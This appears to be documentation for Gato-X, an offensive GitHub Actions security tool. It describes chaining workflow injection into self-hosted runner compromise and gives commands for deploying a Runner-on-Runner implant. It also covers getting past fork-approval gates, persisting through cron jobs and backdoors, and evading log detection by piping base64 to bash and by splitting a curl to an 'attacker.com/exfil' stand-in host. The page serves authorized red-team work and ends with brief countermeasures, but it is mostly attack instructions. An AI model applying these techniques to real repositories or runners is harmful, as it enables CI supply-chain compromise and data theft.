# Complex Attack Scenarios

This page describes advanced attack techniques and scenarios that Gato-X can help execute or defend against.

> **Warning**: These techniques should only be used with proper authorization and for ethical security research purposes.

## Chaining Multiple Vulnerabilities

Many real-world attacks involve chaining multiple vulnerabilities together to achieve the ultimate objective.

### Example: From PR Comment to Self-Hosted Runner

1. **Initial Access**: Exploit an Actions Injection vulnerability in a workflow triggered by issue comments
2. **Privilege Escalation**: Use the injected code to modify workflow files in the repository
3. **Persistence**: Deploy a Runner-on-Runner implant on a self-hosted runner
4. **Lateral Movement**: Use the compromised runner to access other systems on the network

## Custom Runner-on-Runner (RoR) Deployment

Gato-X supports deploying RoR through various methods beyond the standard fork pull request approach.

### Using Custom Workflow via Push Trigger

If you have write access to a repository that uses self-hosted runners:

```bash
gato-x a --workflow --target ORG/REPO --custom-file custom_ror_workflow.yml
```

Where `custom_ror_workflow.yml` contains a workflow that deploys the RoR implant.

### Using Workflow Dispatch with Limited Permissions

If you have a PAT with only the `repo` scope:

1. Generate the RoR payload:
   ```bash
   gato-x a --payload-only --target-os linux --target-arch x64 --c2-repo MyOrg/C2Repo
   ```

2. Create a repository with a workflow that uses the payload

3. Trigger the workflow:
   ```bash
   curl -X POST -H "Authorization: token $GH_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     https://api.github.com/repos/MyOrg/MyRepo/actions/workflows/deploy_ror.yml/dispatches \
     -d '{"ref":"main"}'
   ```

## Bypassing Approval Requirements

In some cases, you may be able to bypass approval requirements for workflows from forks.

### Using a PAT with the `repo` Scope

If you have a PAT with the `repo` scope for a repository:

1. Fork the repository
2. Create a malicious workflow in your fork
3. Submit a pull request
4. Use the PAT to approve the workflow run:
   ```bash
   curl -X POST -H "Authorization: token $GH_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     https://api.github.com/repos/TargetOrg/TargetRepo/actions/runs/12345/approve
   ```

### Exploiting TOCTOU in Approval Workflows

Some approval workflows may be vulnerable to TOCTOU attacks:

1. Submit a benign pull request
2. Wait for approval
3. After approval but before execution, modify the pull request to include malicious code
4. The approved workflow will run the modified code

### Pivoting via GitHub Actions Cache Poisoning



## Advanced Self-Hosted Runner Attacks

### Targeting Specific Runner Labels

If you know that certain runners have specific capabilities or access:

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os linux --target-arch x64 --labels production database
```

This targets runners with both the "production" and "database" labels.

### Persistent Access to Ephemeral Runners

For ephemeral runners that are destroyed after each job:

1. Deploy the RoR implant with the `--keep-alive` flag
2. Use the implant to establish persistence through other means:
   - Create cron jobs
   - Modify startup scripts
   - Deploy additional backdoors

### Network Pivoting

Once you have access to a self-hosted runner, you can use it to pivot to other systems:

1. Use the interactive shell to perform network reconnaissance
2. Deploy network tunneling tools
3. Access internal services not exposed to the internet

## Defense Evasion Techniques

### Avoiding Detection in Logs

1. Use base64 encoding for commands:
   ```yaml
   run: echo "ZWNobyAiaGVsbG8gd29ybGQi" | base64 -d | bash
   ```

2. Split malicious commands across multiple steps

3. Use environment variables to store parts of commands:
   ```yaml
   env:
     CMD_PART1: "curl -s"
     CMD_PART2: "http://attacker.com/exfil"
   run: $CMD_PART1 $CMD_PART2
   ```

### Hiding Malicious Workflows

1. Use non-obvious file names for workflows
2. Place workflows in nested directories
3. Use workflow files that appear benign but contain hidden malicious code

## Countermeasures

To defend against these advanced attacks:

1. Implement strict branch protection rules
2. Require approval for all workflows from forks
3. Use ephemeral runners in isolated environments
4. Implement network segmentation for runners
5. Monitor workflow runs for suspicious activity
6. Regularly audit workflow files and permissions
7. Use the principle of least privilege for all tokens and permissions
